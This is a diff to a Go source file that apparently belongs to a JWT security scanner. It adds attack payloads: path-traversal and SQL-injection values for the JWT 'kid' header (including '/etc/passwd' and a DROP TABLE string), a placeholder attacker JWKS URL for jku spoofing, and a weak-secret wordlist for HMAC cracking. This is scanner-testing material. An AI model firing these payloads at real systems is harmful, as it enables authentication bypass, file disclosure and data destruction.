@@ -46,3 +46,52 @@ var JWTEscalatedValues = map[string]any{
 	"scope":  "admin",
 	"groups": "admin",
 }
+
+// ─── P5 additions ─────────────────────────────────────────────────────
+
+// KidInjectionPayload describes one kid manipulation variant.
+type KidInjectionPayload struct {
+	Class string // "path-traversal" | "sqli"
+	Value string
+}
+
+// KidInjectionPayloads is the set of kid header values jwt-kid-injection
+// injects. One variant per entry. Order is deterministic (declaration order).
+var KidInjectionPayloads = []KidInjectionPayload{
+	{Class: "path-traversal", Value: "../../../dev/null"},
+	{Class: "path-traversal", Value: "../../../../etc/passwd"},
+	{Class: "path-traversal", Value: "/dev/null"},
+	{Class: "sqli", Value: "' OR '1'='1"},
+	{Class: "sqli", Value: "1; DROP TABLE keys--"},
+	{Class: "sqli", Value: "\" OR 1=1--"},
+}
+
+// JWKSAttackerURL is the placeholder attacker JWKS endpoint URL used in
+// jwt-jwks-spoof's jku variant. In a live pentest the user would point
+// this at their own server; for corpus testing the vulnapp trusts any URL.
+const JWKSAttackerURL = "https://attacker.example.com/.well-known/jwks.json"
+
+// HmacCrackWordlist is the extended wordlist for jwt-hmac-crack. Superset
+// of WeakHMACSecrets to also cover common app-specific defaults.
+var HmacCrackWordlist = []string{
+	"secret",
+	"password",
+	"changeme",
+	"key",
+	"jwt",
+	"admin",
+	"",
+	"possession",
+	"1234567890",
+	"test",
+	"abc123",
+	"qwerty",
+	"letmein",
+	"welcome",
+	"your-256-bit-secret",
+	"super-secret-key",
+}
+
+// HmacCrackMaxAttempts caps the number of wordlist entries tried per
+// token location to keep scan runtime bounded.
+const HmacCrackMaxAttempts = 500
